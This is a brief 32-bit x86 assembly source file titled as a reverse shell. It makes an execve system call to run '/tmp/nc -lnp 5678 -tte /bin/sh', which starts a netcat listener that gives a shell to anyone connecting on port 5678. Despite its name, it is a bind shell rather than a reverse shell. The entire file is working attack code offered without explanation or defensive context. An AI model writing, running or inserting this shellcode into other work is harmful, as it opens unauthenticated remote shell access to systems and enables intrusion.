; reverse-shell-32.S:
global _start

  section .text

  _start:
	  mov ebx, filename
	  mov ecx, argv
	  xor edx, edx
	  mov eax, 11
	  int 0x80

  section .rodata
  filename: db "/tmp/nc", 0
  arg1: db "-lnp", 0
  arg2: db "5678", 0
  arg3: db "-tte", 0
  arg4: db "/bin/sh", 0
  argv: dd filename, arg1, arg2, arg3, arg4, 0
